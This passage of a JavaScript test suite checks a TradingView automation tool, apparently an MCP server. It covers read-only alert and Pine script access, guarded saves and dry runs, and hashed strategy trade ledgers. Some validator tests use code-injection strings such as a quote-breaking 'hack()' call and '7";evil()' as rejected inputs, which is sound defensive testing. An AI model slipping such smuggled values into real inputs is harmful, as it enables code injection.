  assert.ok(expr.includes("api.chart(1)"));
  assert.ok(!expr.includes("if (available === false) {\n          return"),
    "a transient unavailable flag must not bypass the retry path");
  assert.ok(expr.includes("if (currentAvailable !== false && currentAvailable !== available)"),
    "pagination must retry after availability changes");
});

test("listAlerts fetches the alerts API read-only with the app session", async () => {
  const cdp = fakeCdp([]);
  const tv = new TradingView(cdp);
  await tv.listAlerts();
  const expr = cdp.calls[0];
  assert.ok(expr.includes("https://pricealerts.tradingview.com/list_alerts"));
  assert.ok(expr.includes('credentials: "include"'));
  assert.ok(!/create_alert|modify|delete/.test(expr), "must stay read-only");
});

test("createPriceAlert posts a bounded non-webhook alert and verifies readback", async () => {
  const cdp = fakeCdp({
    requestId: 9,
    alertId: 10,
    name: "BUSHIDO-MCP:0123456789abcdef:confirmation",
    symbol: "OANDA:USDJPY",
    resolution: "240",
    operator: "cross_up",
    level: 162.3,
    expiration: "2099-01-01T00:00:00.000Z",
    verified: true,
  });
  const tv = new TradingView(cdp);
  const result = await tv.createPriceAlert({
    symbol: "OANDA:USDJPY",
    resolution: "240",
    operator: "cross_up",
    level: 162.3,
    expiration: "2099-01-01T00:00:00.000Z",
    name: "BUSHIDO-MCP:0123456789abcdef:confirmation",
    message: "Bushido confirmation",
    mobilePush: true,
    popup: true,
    playSound: false,
  });
  assert.equal(result.verified, true);
  const expr = cdp.calls[0];
  assert.ok(expr.includes("https://pricealerts.tradingview.com/create_alert"));
  assert.ok(expr.includes('method: "POST"'));
  assert.ok(expr.includes("JSON.stringify({ payload })"));
  assert.ok(expr.includes("cross_interval: true"));
  assert.ok(expr.includes('created.s !== "ok"'));
  assert.ok(expr.includes("https://pricealerts.tradingview.com/list_alerts"));
  assert.ok(expr.includes("web_hook: null"));
  assert.ok(expr.includes("email: false"));
  assert.ok(expr.includes("sms_over_email: false"));
  assert.ok(!expr.includes("modify_restart_alert"));
  assert.ok(!expr.includes("delete_alerts"));
});

test("createPriceAlert validates ownership and values before touching the page", () => {
  const cdp = fakeCdp();
  const tv = new TradingView(cdp);
  assert.throws(() => tv.createPriceAlert({
    symbol: "OANDA:USDJPY",
    resolution: "240",
    operator: "cross_up",
    level: 162.3,
    expiration: "2099-01-01T00:00:00.000Z",
    name: "not-owned",
    message: "x",
    mobilePush: false,
    popup: false,
    playSound: false,
  }), /ownership label/);
  assert.equal(cdp.calls.length, 0);
});

test("listPineScripts fetches saved scripts read-only and cross-references charts", async () => {
  const cdp = fakeCdp([]);
  const tv = new TradingView(cdp);
  await tv.listPineScripts();
  const expr = cdp.calls[0];
  assert.ok(expr.includes("https://pine-facade.tradingview.com/pine-facade/list/?filter=saved"));
  assert.ok(expr.includes('credentials: "include"'), "must use the logged-in session");
  assert.ok(expr.includes('v.id === "pineId"'), "must map scripts to on-chart studies");
  assert.ok(expr.includes('v.id === "pineVersion"'), "must expose each on-chart instance version");
  assert.ok(!/\/save|\/delete|\/new|method:/i.test(expr), "must stay read-only GET");
  // the list must apply the exact same USER;-only gate as getPineSource, so
  // nothing listed can ever be refused by the source tool
  assert.ok(expr.includes('"^USER;[\\\\w]{8,64}$"'), "list must filter by the shared pine id pattern");
  assert.ok(expr.includes("PINE_ID.test(s.scriptIdPart)"));
});

test("getPineSource accepts only own USER;… ids and validates before the page", async () => {
  const cdp = fakeCdp({ source: "//@version=5" });
  const tv = new TradingView(cdp);
  for (const bad of [
    "PUB;abcdef1234567890", // third-party published script
    "USER;short",
    'USER;abc12345"); hack(); ("',
    "USER;",
    "",
    "adc40b1dfee344f19412f1ae9af74f3f",
  ]) {
    assert.throws(() => tv.getPineSource(bad), /pineId must look like/, bad);
  }
  assert.equal(cdp.calls.length, 0, "no expression should reach the page");

  await tv.getPineSource("USER;adc40b1dfee344f19412f1ae9af74f3f");
  const expr = cdp.calls[0];
  assert.ok(expr.includes('"USER;adc40b1dfee344f19412f1ae9af74f3f"'), "pineId quoted as JSON");
  assert.ok(expr.includes("encodeURIComponent(pineId)"), "id must be URL-encoded");
  assert.ok(expr.includes("https://pine-facade.tradingview.com/pine-facade/get/"));
  assert.ok(expr.includes('credentials: "include"'));
  assert.ok(!/\/save|\/delete|\/new|method:/i.test(expr), "must stay read-only GET");
});

test("fixed Pine hashes bind the response identity and preserve original and LF-normalized text", async () => {
  const pineId = "USER;12345678abcdef12";
  const version = "4.0";
  const cdp = fakeCdp({});
  const tv = new TradingView(cdp);
  assert.throws(() => tv.getFixedPineSourceHashes(pineId, "last"), /version number/);
  assert.equal(cdp.calls.length, 0);
  await tv.getFixedPineSourceHashes(pineId, version);
  const source = '\uFEFF//@version=5\r\n// café 😀\r\n\n';
  const body = JSON.stringify({ scriptIdPart: pineId, version, source });
  const { result, calls } = await fixedPinePage(cdp.calls[0], body);
  const hash = (value) => "sha256:" + createHash("sha256").update(value).digest("hex");
  assert.equal(result.rawSourceSha256, hash(source));
  assert.equal(result.sourceSha256, hash(source.replace(/\r\n/g, "\n")));
  assert.equal(result.sourceBytes, Buffer.byteLength(source));
  assert.equal(result.responseBytes, Buffer.byteLength(body));
  assert.equal(Object.hasOwn(result, "source"), false);
  assert.equal(calls.length, 1);
  assert.match(calls[0].url, /\/USER%3B12345678abcdef12\/4\.0$/);
  assert.equal(calls[0].init.redirect, "error");
  assert.equal(result.scriptIdEvidence, "response_field");
  // The get endpoint may omit the id: the hashes then rest on the requested URL alone.
  const withoutId = await fixedPinePage(cdp.calls[0], JSON.stringify({ version, source }));
  assert.equal(withoutId.result.rawSourceSha256, hash(source));
  assert.equal(withoutId.result.scriptIdEvidence, "request_url_only");
  for (const [detail, reason] of [
    [{ scriptIdPart: "USER;different000000", version, source }, /names a different script/],
    [{ scriptIdPart: null, version, source }, /names a different script/],
    [{ scriptIdPart: pineId, version: "4.1", source }, /version does not match: "4\.1"$/],
    [{ scriptIdPart: pineId, version: 4, source }, /version does not match: number 4$/],
    [{ scriptIdPart: pineId, source }, /version does not match: undefined$/],
    [{ scriptIdPart: pineId, version: "4.0 <script>", source }, /version does not match: string$/],
    [{ scriptIdPart: pineId, version, source: 7 }, /no string source/],
    [{ scriptIdPart: pineId, version }, /no string source/],
    [[{ scriptIdPart: pineId, version, source }], /not a JSON object/],
    [null, /not a JSON object/],
  ]) {
    await assert.rejects(fixedPinePage(cdp.calls[0], JSON.stringify(detail)), reason, JSON.stringify(detail));
  }
  await assert.rejects(fixedPinePage(cdp.calls[0], Buffer.from([0xff])), /complete UTF-8 JSON/);
});

test("fixed Pine response caps the full envelope before parsing, including at the EOF boundary", async () => {
  const cdp = fakeCdp({});
  const tv = new TradingView(cdp);
  const scriptIdPart = "USER;12345678abcdef12";
  const version = "4.0";
  await tv.getFixedPineSourceHashes(scriptIdPart, version);
  const expr = cdp.calls[0];
  const makeBody = (source) => JSON.stringify({ scriptIdPart, version, source });
  const limit = 128 * 1024;
  const exact = makeBody("a".repeat(limit - Buffer.byteLength(makeBody(""))));
  const reads = [];
  const { result } = await fixedPinePage(expr, exact, { reads });
  assert.equal(result.responseBytes, limit);
  assert.equal(reads.reduce((a, b) => a + b, 0), limit);
  const overReads = [];
  await assert.rejects(fixedPinePage(expr, exact + " ", { reads: overReads, fastDeadline: true }), /EOF unconfirmed/);
  assert.equal(overReads.reduce((a, b) => a + b, 0), limit, "no extra byte requested to prove EOF");
  const headerReads = [];
  await assert.rejects(fixedPinePage(expr, exact, { reads: headerReads, declared: limit + 1 }), /byte limit/);
  assert.deepEqual(headerReads, [], "oversize Content-Length stops before the first body read");
});

test("fixed Pine hashes reject partial HTTP responses and incomplete bodies", async () => {
  const cdp = fakeCdp({});
  const scriptIdPart = "USER;12345678abcdef12";
  const version = "4.0";
  await new TradingView(cdp).getFixedPineSourceHashes(scriptIdPart, version);
  const expr = cdp.calls[0];
  const body = JSON.stringify({ scriptIdPart, version, source: "plot(close)\n" });
  const length = Buffer.byteLength(body);
  const contentRange = { "Content-Range": "bytes 0-" + (length - 1) + "/" + (length * 2) };
  for (const [status, headers] of [[206, contentRange], [206, {}], [200, contentRange]]) {
    const reads = [];
    await assert.rejects(fixedPinePage(expr, body, { status, headers, reads }), /not a complete HTTP 200 response/);
    assert.deepEqual(reads, [], "partial response is rejected before reading the body");
  }
  await assert.rejects(fixedPinePage(expr, body, { declared: length + 1 }), /length does not match/);
  await assert.rejects(fixedPinePage(expr, body.slice(0, -1)), /not complete UTF-8 JSON/);
  assert.equal((await fixedPinePage(expr, body, { declared: length })).result.responseBytes, length);
});

async function fixedPinePage(expression, body, { reads = [], declared, fastDeadline = false, status = 200, headers = {} } = {}) {
  const bytes = Buffer.from(body);
  const calls = [];
  let offset = 0;
  const stream = new ReadableStream({
    type: "bytes",
    pull(controller) {
      const request = controller.byobRequest;
      const size = Math.min(request.view.byteLength, bytes.length - offset);
      reads.push(request.view.byteLength);
      request.view.set(bytes.subarray(offset, offset + size));
      offset += size;
      request.respond(size);
      if (offset === bytes.length) controller.close();
    },
  });
  const response = new Response(stream, {
    status,
    headers: { ...headers, ...(declared === undefined ? {} : { "Content-Length": String(declared) }) },
  });
  const context = vm.createContext({
    TextEncoder, TextDecoder, AbortController, clearTimeout,
    setTimeout: fastDeadline ? (callback) => setTimeout(callback, 25) : setTimeout,
    crypto: webcrypto,
    fetch: async (url, init) => { calls.push({ url, init }); return response; },
  });
  const result = await vm.runInContext(expression, context);
  return { result, calls };
}

test("savePineScript validates inputs before touching the page", async () => {
  const cdp = fakeCdp();
  const tv = new TradingView(cdp);
  await assert.rejects(() => tv.savePineScript({ source: "" }), /non-empty string/);
  await assert.rejects(() => tv.savePineScript({ source: "   " }), /non-empty string/);
  await assert.rejects(() => tv.savePineScript({ source: "x".repeat(200_001), name: "n" }), /too large/);
  await assert.rejects(
    () => tv.savePineScript({ source: "plot(close)", pineId: "PUB;abcdef1234567890" }),
    /pineId must look like/,
  );
  await assert.rejects(() => tv.savePineScript({ source: "plot(close)" }), /name is required/);
  await assert.rejects(
    () => tv.savePineScript({ source: "plot(close)", name: "x".repeat(101) }),
    /at most 100/,
  );
  assert.equal(cdp.calls.length, 0, "no expression should reach the page");
});

test("savePineScript without confirm is a dry run that writes nothing", async () => {
  const cdp = fakeCdp({});
  const tv = new TradingView(cdp);
  const dry = await tv.savePineScript({ source: "//@version=5\nplot(close)", name: "New Script" });
  assert.equal(dry.dryRun, true);
  assert.equal(dry.action, "create_new");
  assert.match(dry.note, /DRY RUN/);
  assert.equal(cdp.calls.length, 0, "create_new dry run must not touch the page at all");

  const cdp2 = fakeCdp({ pineId: "USER;adc40b1dfee344f19412f1ae9af74f3f", name: "Old", version: "3.0", sourceLength: 100, source: "old" });
  const tv2 = new TradingView(cdp2);
  const dry2 = await tv2.savePineScript({
    source: "//@version=5\nplot(close)",
    pineId: "USER;adc40b1dfee344f19412f1ae9af74f3f",
  });
  assert.equal(dry2.dryRun, true);
  assert.equal(dry2.action, "new_version");
  assert.equal(dry2.currentVersion, "3.0");
  assert.equal(dry2.currentSourceLength, 100);
  assert.equal(cdp2.calls.length, 1, "only the current source is fetched");
  assert.ok(cdp2.calls[0].includes("pine-facade/get/"), "dry run reads, never writes");
  assert.ok(!/save\/(new|next)|saveNew|saveNext/.test(cdp2.calls[0]), "no save call in a dry run");
});

test("savePineScript with confirm saves non-destructively and verifies", async () => {
  const cdp = fakeCdp({ dryRun: false });
  const tv = new TradingView(cdp);
  await tv.savePineScript({ source: "//@version=5\nplot(close)", name: "New Script", confirm: true });
  const create = cdp.calls[0];
  assert.ok(
    create.includes("lib.saveNew({ scriptSource: source, scriptName: name })"),
    "new scripts use saveNew without the overwrite option",
  );
  assert.ok(create.includes("already exists"), "duplicate names must be detected up front");
  assert.ok(create.includes('"New Script"'), "name quoted as JSON");
  assert.ok(create.includes("/last"), "result is verified by fetching the saved version back");
  assert.ok(create.includes("pine-facade save failed"), "string rejections must become real errors");

  await tv.savePineScript({
    source: "//@version=5\nplot(close)",
    pineId: "USER;adc40b1dfee344f19412f1ae9af74f3f",
    confirm: true,
  });
  const next = cdp.calls[1];
  assert.ok(next.includes("lib.saveNext"), "existing scripts get a new version");
  assert.ok(next.includes("isLegacyScript: false"));
  assert.ok(next.includes('"USER;adc40b1dfee344f19412f1ae9af74f3f"'), "pineId quoted as JSON");
  assert.ok(next.includes("revertHint") && next.includes("get_pine_source"),
    "a broken save must explain how to revert");
});

test("addPineToChart validates and only ever adds studies", async () => {
  const cdp = fakeCdp({ studyId: "x", name: null, isStrategy: false, chartIndex: null });
  const tv = new TradingView(cdp);
  assert.throws(() => tv.addPineToChart("PUB;abcdef1234567890"), /pineId must look like/);
  assert.throws(() => tv.addPineToChart("USER;adc40b1dfee344f19412f1ae9af74f3f", -1), /chartIndex must be/);
  assert.equal(cdp.calls.length, 0);

  await tv.addPineToChart("USER;adc40b1dfee344f19412f1ae9af74f3f", 1);
  const expr = cdp.calls[0];
  assert.ok(expr.includes('{ type: "pine", pineId, version: "last" }'), "insert by pine descriptor");
  assert.ok(expr.includes("api.chart(1)"), "should target chart 1");
  assert.ok(!expr.includes("removeEntity"), "must never remove studies");
});

test("addPineToChart can pin a saved version without changing the latest-version default", async () => {
  const cdp = fakeCdp();
  const tv = new TradingView(cdp);
  await tv.addPineToChart("USER;adc40b1dfee344f19412f1ae9af74f3f", 1, "7.0");
  assert.ok(cdp.calls[0].includes('version: "7.0"'));
  assert.ok(!cdp.calls[0].includes('version: "last"'));
  assert.throws(() => tv.addPineToChart("USER;adc40b1dfee344f19412f1ae9af74f3f", 1, '7";evil()'), /version/);
  assert.equal(cdp.calls.length, 1);
});

test("getPineStudyStatus reads identity, loading and history bounds on one explicit chart", async () => {
  const cdp = fakeCdp();
  const tv = new TradingView(cdp);
  assert.throws(() => tv.getPineStudyStatus('bad id', 1), /studyId/);
  assert.throws(() => tv.getPineStudyStatus('new1', -1), /chartIndex/);
  assert.throws(() => tv.getPineStudyStatus('new1', undefined), /chartIndex/);
  await tv.getPineStudyStatus('new1', 1);
  assert.equal(cdp.calls.length, 1);
  const expression = cdp.calls[0];
  const chart = {
    symbol: () => 'OANDA:EURUSD', resolution: () => '61',
    getAllStudies: () => [{id:'new1',name:'Measure'}],
    getStudyById: () => ({isLoading:()=>false,getInputValues:()=>[
      {id:'pineId',value:'USER;abcdefgh'}, {id:'pineVersion',value:'7.0'}, {id:'text',value:'PRIVATE SOURCE'},
    ]}),
    chartModel: () => ({mainSeries:()=>({bars:()=>({_items:[{value:[100,1]},{value:[200,2]}]})})}),
  };
  const result = vm.runInNewContext(expression, {window:{TradingViewApi:{chart:(index)=>{assert.equal(index,1);return chart;}}}});
  assert.deepEqual(JSON.parse(JSON.stringify(result)), { studyId:'new1',pineId:'USER;abcdefgh',pineVersion:'7.0',loading:false,
    chartIndex:1,symbol:'OANDA:EURUSD',resolution:'61',barsCount:2,earliestTime:100,latestTime:200 });
  assert.equal(JSON.stringify(result).includes('PRIVATE SOURCE'), false);
  assert.ok(!expression.includes('activeChart()'));
  assert.ok(!expression.includes('getIndicatorTables'));
});

test("removePineFromChart validates ownership before removing one exact study", async () => {
  const cdp = fakeCdp({ removed: true });
  const tv = new TradingView(cdp);
  assert.throws(
    () => tv.removePineFromChart("PUB;abcdef1234567890", "st1"),
    /pineId must look like/,
  );
  assert.throws(
    () => tv.removePineFromChart("USER;adc40b1dfee344f19412f1ae9af74f3f", "has space"),
    /studyId must match/,
  );
  assert.equal(cdp.calls.length, 0);

  await tv.removePineFromChart("USER;adc40b1dfee344f19412f1ae9af74f3f", "st1", 1);
  const expr = cdp.calls[0];
  assert.ok(expr.includes('value.id === "pineId"'));
  assert.ok(expr.includes('actualPineId !== pineId'));
  assert.ok(expr.includes('chart.removeEntity(studyId)'));
  assert.ok(expr.indexOf('actualPineId !== pineId') < expr.indexOf('chart.removeEntity(studyId)'));
  assert.ok(expr.includes('api.chart(1)'));
});

test("getStrategyReport is read-only and refuses stale reports", async () => {
  const cdp = fakeCdp({});
  const tv = new TradingView(cdp);
  assert.throws(() => tv.getStrategyReport({ tradesLimit: 0 }), /tradesLimit must be/);
  assert.throws(() => tv.getStrategyReport({ tradesLimit: 501 }), /tradesLimit must be/);
  assert.throws(() => tv.getStrategyReport({ tradesLimit: 2.5 }), /tradesLimit must be/);
  assert.equal(cdp.calls.length, 0);

  await tv.getStrategyReport({ tradesLimit: 10 });
  const expr = cdp.calls[0];
  assert.ok(expr.includes("activeStrategyReportData"), "must read the strategy tester data");
  // a removed strategy leaves its report behind: the gate must reject it
  assert.ok(expr.includes("act === null || act === undefined"), "stale reports must be refused");
  assert.ok(expr.includes("no strategy report available"), "missing report must fail clearly");
  assert.ok(!expr.includes("createStudy") && !expr.includes("removeEntity"), "must not touch the chart");
});

test("getStrategyReport reads compact trade rows and marks the live position open", async () => {
  const cdp = fakeCdp({});
  const tv = new TradingView(cdp);
  const fx = strategyLedgerFixture();
  const asPlain = (value) => JSON.parse(JSON.stringify(value));
  await tv.getStrategyReport({ tradesLimit: 10 });
  const report = asPlain(await fx.run(cdp.calls.at(-1)));
  const side = (time, price, label) => ({ time, timeIso: new Date(time).toISOString(), price, label });
  assert.deepEqual(report.trades, [
    { number: null, direction: "long", status: "closed", entry: side(1_700_000_000_000, 100, "Long"),
      exit: side(1_700_000_060_000, 102, "Long Exit"), profit: 250, profitPercent: 0.0025, cumulativeProfit: 250, quantity: 10 },
    { number: null, direction: "long", status: "open", entry: side(1_700_000_120_000, 102, "Long"),
      exit: null, profit: 25, profitPercent: 0.00025, cumulativeProfit: 275, quantity: 5 },
  ]);
  assert.equal(report.totalTrades, 1, "the summary still counts closed trades only");
  await tv.getStrategyReport({ tradesLimit: 1 });
  const latest = asPlain(await fx.run(cdp.calls.at(-1)));
  assert.deepEqual(latest.trades.map((trade) => [trade.status, trade.exit, trade.quantity]), [["open", null, 5]]);

  // Without the open row (counts match), the last row is a real closed trade.
  fx.report.trades = fx.report.trades.slice(0, 1);
  await tv.getStrategyReport({ tradesLimit: 10 });
  const closedOnly = asPlain(await fx.run(cdp.calls.at(-1)));
  assert.deepEqual(closedOnly.trades.map((trade) => [trade.status, trade.exit?.label]), [["closed", "Long Exit"]]);
  // An empty exit label alone is not the open row when the counts do not say so.
  fx.report.trades = [{ ...fx.report.trades[0], x: { tm: 1_700_000_060_000, p: 102, c: "", tp: "lx" } }];
  const unlabeled = asPlain(await fx.run(cdp.calls.at(-1)));
  assert.deepEqual(unlabeled.trades.map((trade) => [trade.status, trade.exit?.label]), [["closed", ""]]);
  // Nor is an extra row whose exit carries a real label.
  fx.report.performance.all.totalTrades = 0;
  fx.report.trades = [{ ...fx.report.trades[0], x: { tm: 1_700_000_060_000, p: 102, c: "Long Exit", tp: "lx" } }];
  const labeled = asPlain(await fx.run(cdp.calls.at(-1)));
  assert.deepEqual(labeled.trades.map((trade) => [trade.status, trade.exit?.label]), [["closed", "Long Exit"]]);
});

test("getStrategyReport still reads the long-name trade rows of older builds", async () => {
  const cdp = fakeCdp({});
  const tv = new TradingView(cdp);
  const fx = strategyLedgerFixture();
  const asPlain = (value) => JSON.parse(JSON.stringify(value));
  fx.report.performance.all.totalTrades = 1;
  fx.report.trades = [{
    tradeNumber: 2,
    entry: { time: 1_700_000_120_000, price: 102, id: "Short", type: "short" },
    exit: { time: 1_700_000_240_000, price: 103, id: "Short Exit" },
    profit: { value: -125, percentValue: -0.00125 },
    cumulativeProfit: { value: 125 },
    quantity: 5,
  }];
  await tv.getStrategyReport({ tradesLimit: 5 });
  const report = asPlain(await fx.run(cdp.calls.at(-1)));
  assert.deepEqual(report.trades, [{
    number: 2, direction: "short", status: "closed",
    entry: { time: 1_700_000_120_000, timeIso: new Date(1_700_000_120_000).toISOString(), price: 102, label: "Short" },
    exit: { time: 1_700_000_240_000, timeIso: new Date(1_700_000_240_000).toISOString(), price: 103, label: "Short Exit" },
    profit: -125, profitPercent: -0.00125, cumulativeProfit: 125, quantity: 5,
  }]);
});

test("getStrategyTradeLedger paginates all normalized trades behind a stable ledger id", async () => {
  const cdp = fakeCdp({});
  const tv = new TradingView(cdp);
  assert.throws(() => tv.getStrategyTradeLedger({ offset: -1 }), /offset must be/);
  assert.throws(() => tv.getStrategyTradeLedger({ limit: 0 }), /limit must be/);
  assert.throws(() => tv.getStrategyTradeLedger({ limit: 501 }), /limit must be/);
  assert.throws(
    () => tv.getStrategyTradeLedger({ expectedLedgerId: "sha256:not-a-hash" }),
    /expectedLedgerId must be/,
  );
  assert.equal(cdp.calls.length, 0);

  await tv.getStrategyTradeLedger({ offset: 0, limit: 1 });
  const expr = cdp.calls[0];
  assert.ok(expr.includes("const allTrades = rawTrades.map"), "ledger identity must cover all trades");
  assert.ok(expr.includes("allTrades.slice(offset, offset + limit)"), "only the requested page is returned");
  assert.ok(expr.includes('subtle.digest("SHA-256"'), "pages must be bound by a cryptographic id");
  const identityStart = expr.indexOf("const identity = JSON.stringify({");
  const identityEnd = expr.indexOf("});", identityStart);
  assert.ok(identityStart >= 0 && identityEnd > identityStart);
  assert.ok(!expr.slice(identityStart, identityEnd).includes("studyId"),
    "ephemeral study ids must not make identical reruns hash differently");
  assert.ok(expr.includes("activeStrategy.value()"), "removed-strategy reports must be refused");
  assert.ok(!expr.includes("createStudy") && !expr.includes("removeEntity"), "ledger reads must not touch the chart");

  const report = {
    currency: "USD",
    settings: { dateRange: { backtest: { from: 1_700_000_000_000, to: 1_700_100_000_000 } } },
    performance: {
      initialCapital: 100_000,
      maxStrategyDrawDown: 40,
      maxStrategyDrawDownPercent: 0.0004,
      all: {
        totalTrades: 2,
        netProfit: 125,
        netProfitPercent: 0.00125,
        numberOfWiningTrades: 1,
        numberOfLosingTrades: 1,
        percentProfitable: 0.5,
        profitFactor: 1.2,
        grossProfit: 250,
        grossLoss: -125,
        commissionPaid: 5,
      },
    },
    trades: [
      {
        e: { tm: 1_700_000_000_000, p: 100, c: "Long", tp: "le" },
        x: { tm: 1_700_000_060_000, p: 102, c: "Long Exit", tp: "lx" },
        tp: { v: 250, p: 0.0025 },
        cp: { v: 250, p: 0.0025 },
        q: 10,
        cm: 2.5,
        rn: { v: 300, p: 0.003 },
        dd: { v: 50, p: 0.0005 },
      },
      {
        tradeNumber: 2,
        entry: { time: 1_700_000_120_000, price: 102, id: "Short", type: "short" },
        exit: { time: 1_700_000_240_000, price: 103, id: "Short Exit" },
        profit: { value: -125, percentValue: -0.00125 },
        cumulativeProfit: { value: 125 },
        quantity: 5,
      },
    ],
  };
  const activeChart = {
    symbol: () => "OANDA:EURUSD",
    resolution: () => "60",
    getAllStudies: () => [{ id: "strategy-1", name: "Ledger Strategy" }],
    getStudyById: () => ({
      getInputsInfo: () => [{ id: "in_0", localizedName: "Length" }],
      getInputValues: () => [
        { id: "pineId", value: "USER;12345678abcdef12" },
        { id: "pineVersion", value: "4.0" },
        { id: "text", value: "secret source is excluded" },
        { id: "in_0", value: 14 },
      ],
    }),
  };
  const strategySource = {
    id: () => "strategy-1",
    metaInfo: () => ({ description: "Ledger Strategy" }),
    reportData: () => report,
  };
  activeChart._chartWidget = {
    _lineToolsSynchronizer: {
      _chartModel: {
        activeStrategySource: () => ({ value: () => strategySource }),
      },
    },
  };
  const context = vm.createContext({
    crypto: webcrypto,
    TextEncoder,
    window: {
      TradingViewApi: {
        activeChart: () => activeChart,
      },
    },
  });
  const page = await vm.runInContext(expr, context);
  assert.match(page.ledgerId, /^sha256:[a-f0-9]{64}$/);
  assert.equal(page.availableTrades, 2);
  assert.equal(page.symbol, "OANDA:EURUSD");
  assert.equal(page.timeframe, "60");
  assert.equal(page.pineId, "USER;12345678abcdef12");
  assert.equal(page.pineVersion, "4.0");
  assert.deepEqual(JSON.parse(JSON.stringify(page.inputs)), [{ id: "in_0", name: "Length", value: 14 }]);
  assert.equal(page.countMatchesSummary, true);
  assert.equal(page.offset, 0);
  assert.equal(page.returned, 1);
  assert.equal(page.nextOffset, 1);
  assert.equal(page.complete, false);
  assert.equal(page.trades[0].reportIndex, 0);
  assert.equal(page.trades[0].number, null);
  assert.equal(page.trades[0].direction, "long");
  assert.equal(page.trades[0].durationMilliseconds, 60_000);
  assert.equal(page.trades[0].commission, 2.5);
  assert.equal(page.trades[0].runUp, 300);
  assert.equal(page.trades[0].drawDown, 50);
  assert.deepEqual([...page.unavailableFields], [], "a field is available if any trade exposes it");
  assert.deepEqual([...page.qualityIssues], []);

  await tv.getStrategyTradeLedger({
    offset: 0,
    limit: 1,
    expectedLedgerId: `sha256:${"0".repeat(64)}`,
  });
  await assert.rejects(
    () => vm.runInContext(cdp.calls[1], vm.createContext({
      crypto: webcrypto,
      TextEncoder,
      window: context.window,
    })),
    /strategy report changed between ledger pages/,
  );

  report.performance.all.totalTrades = 1;
  report.performance.openPL = 25;
  report.trades = [
    report.trades[0],
    {
      e: { tm: 1_700_000_120_000, p: 102, c: "Long", tp: "le" },
      x: { tm: 1_700_000_300_000, p: 103, c: "", tp: "lx" },
      tp: { v: 25, p: 0.00025 },
      cp: { v: 275, p: 0.00275 },
      q: 5,
    },
  ];
  await tv.getStrategyTradeLedger({ offset: 0, limit: 500 });
  const withOpenPosition = await vm.runInContext(cdp.calls[2], vm.createContext({
    crypto: webcrypto,
    TextEncoder,
    window: context.window,
  }));
  assert.equal(withOpenPosition.totalTrades, 1, "summary counts only closed trades");
  assert.equal(withOpenPosition.availableTrades, 2, "ledger retains the marked-to-market open row");
  assert.equal(withOpenPosition.countMatchesSummary, true);
  assert.equal(withOpenPosition.trades[1].status, "open");
  assert.equal(withOpenPosition.trades[1].exit, null, "mark-to-market pseudo exit is not a real fill");
  assert.ok(!withOpenPosition.qualityIssues.includes("report_trade_count_mismatch"));

  const state = {
    schema: "pine_report_state_v1", ledgerId: withOpenPosition.ledgerId, studyId: "strategy-1", currency: "USD",
    metrics: {
      netProfit: 125, netProfitPercent: 0.00125, maxDrawdown: 40, maxDrawdownPercent: 0.0004,
      totalTrades: 1, winningTrades: 1, profitFactor: 1.2, percentProfitable: 0.5,
    },
    openProfit: 25, totalProfit: null,
  };
  const reportStateSha256 = "sha256:" + createHash("sha256").update(JSON.stringify(state)).digest("hex");
  await tv.getStrategyTradeLedger({
    identityStudyId: "strategy-1", expectedLedgerId: withOpenPosition.ledgerId,
    expectedReportStateSha256: reportStateSha256,
  });
  const identityExpr = cdp.calls.at(-1);
  const identity = await vm.runInContext(identityExpr, context);
  assert.deepEqual(JSON.parse(JSON.stringify(identity)), {
    ledgerId: withOpenPosition.ledgerId, studyId: "strategy-1",
    pineId: "USER;12345678abcdef12", pineVersion: "4.0", reportStateSha256,
  });
  assert.ok(Buffer.byteLength(JSON.stringify(identity)) < 8192);
  report.performance.all.netProfit = 150;
  assert.equal((await vm.runInContext(cdp.calls[2], context)).ledgerId, withOpenPosition.ledgerId,
    "ordinary pagination keeps its existing identity schema");
  await assert.rejects(vm.runInContext(identityExpr, context), /captured strategy report metrics do not match/);
  report.performance.all.netProfit = 125;
  for (const [object, key, changed] of [
    [report.performance.all, "netProfit", 150],
    [report.performance.all, "profitFactor", 1.4],
    [report.performance, "maxStrategyDrawDown", 41],
    [report.performance, "openPL", 26],
  ]) {
    const before = object[key];
    object[key] = changed;
    await assert.rejects(vm.runInContext(identityExpr, context), /captured strategy report metrics do not match/);
    object[key] = before;
    let hashes = 0;
    await assert.rejects(vm.runInContext(identityExpr, vm.createContext({
      TextEncoder, window: context.window,
      crypto: { subtle: { digest: async (...args) => {
        const digest = await webcrypto.subtle.digest(...args);
        if (++hashes === 2) object[key] = changed;
        return digest;
      } } },
    })), /strategy report metrics changed during Pine identity verification/);
    object[key] = before;
  }
  report.trades[0].q = 11;
  await assert.rejects(vm.runInContext(identityExpr, context), /captured strategy ledger does not match/);
  report.trades[0].q = 10;
  strategySource.id = () => undefined;
  await assert.rejects(vm.runInContext(identityExpr, context), /captured active study id does not match/);
  strategySource.id = () => "strategy-1";
  await assert.rejects(vm.runInContext(identityExpr, vm.createContext({
    TextEncoder, window: context.window,
    crypto: { subtle: { digest: async (...args) => {
      const digest = await webcrypto.subtle.digest(...args);
      report.trades[0].q = 11;
      return digest;
    } } },
  })), /report contents changed during Pine identity verification/);
  report.trades[0].q = 10;
  let versionReads = 0;
  const getStudyById = activeChart.getStudyById;
  activeChart.getStudyById = () => ({
    ...getStudyById(),
    getInputValues: () => getStudyById().getInputValues().map((value) =>
      value.id === "pineVersion" && ++versionReads === 2 ? { ...value, value: "4.1" } : value),
  });
  await assert.rejects(vm.runInContext(identityExpr, context), /active Pine version changed/);
});

// A Strategy Tester page with one closed trade and the marked-to-market open row.
// Every object the page reads is reachable from `fx`, so a test can swap it.
function strategyLedgerFixture() {
  const report = {
    currency: "USD",
    // As on the live app: no Properties in settings and no initial capital here.
    settings: { dateRange: { backtest: { from: 1_700_000_000_000, to: 1_700_100_000_000 } } },
    performance: {
      maxStrategyDrawDown: 40, maxStrategyDrawDownPercent: 0.0004, openPL: 25,
      all: {
        totalTrades: 1, netProfit: 125, netProfitPercent: 0.00125, numberOfWiningTrades: 1, numberOfLosingTrades: 0,
        percentProfitable: 0.5, profitFactor: 1.2, grossProfit: 250, grossLoss: -125, commissionPaid: 5,
      },
    },
    trades: [
      { e: { tm: 1_700_000_000_000, p: 100, c: "Long", tp: "le" }, x: { tm: 1_700_000_060_000, p: 102, c: "Long Exit", tp: "lx" },
        tp: { v: 250, p: 0.0025 }, cp: { v: 250, p: 0.0025 }, q: 10, cm: 2.5 },
      { e: { tm: 1_700_000_120_000, p: 102, c: "Long", tp: "le" }, x: { tm: 1_700_000_300_000, p: 103, c: "", tp: "lx" },
        tp: { v: 25, p: 0.00025 }, cp: { v: 275, p: 0.00275 }, q: 5 },
    ],
  };
  const fx = {
    report,
    symbol: "OANDA:EURUSD",
